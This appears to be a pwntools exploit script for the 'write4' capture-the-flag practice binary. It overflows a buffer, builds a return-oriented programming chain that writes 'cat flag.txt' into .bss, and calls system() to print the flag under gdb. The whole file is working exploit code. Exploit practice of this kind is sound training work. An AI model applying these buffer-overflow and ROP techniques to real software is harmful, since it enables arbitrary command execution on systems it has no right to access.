#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

mov_r15_into_r14 = 0x0000000000400820
pop_r14_r15_addr = 0x0000000000400890
pop_rdi_addr = 0x0000000000400893

def rop_move(dst, qword):
    rop = ''
    rop += p64(pop_r14_r15_addr)
    rop += p64(dst)
    rop += qword
    rop += p64(mov_r15_into_r14)
    return rop
    
filename = './write4'

binary = ELF(filename)
rop = ROP(filename)

padding = 'A' * 40
bss_addr = binary.bss(0)
system_addr = binary.symbols['system']

payload = padding

# move 'cat flag.txt\x00\x00\x00\x00' to bss
command = 'cat flag.txt\x00\x00\x00\x00'
for index in xrange(0, len(command), 8):
    payload += rop_move(bss_addr+index, command[index:index+8])

# system(*'cat flag.txt')
payload += p64(pop_rdi_addr)
payload += p64(bss_addr)
payload += p64(system_addr)

p = process(filename)

gdb.attach(p, '''
        break *%s
        continue
        ''' % pop_r14_r15_addr)
"""
gdb.attach(p, '''
        break *%s
        continue
        ''' % binary.symbols['system'])
"""

p.recvuntil('> ')

p.sendline(payload)

p.sendline('cat flag.txt')

log.info("Flag: {p.recv(1024).decode()}")
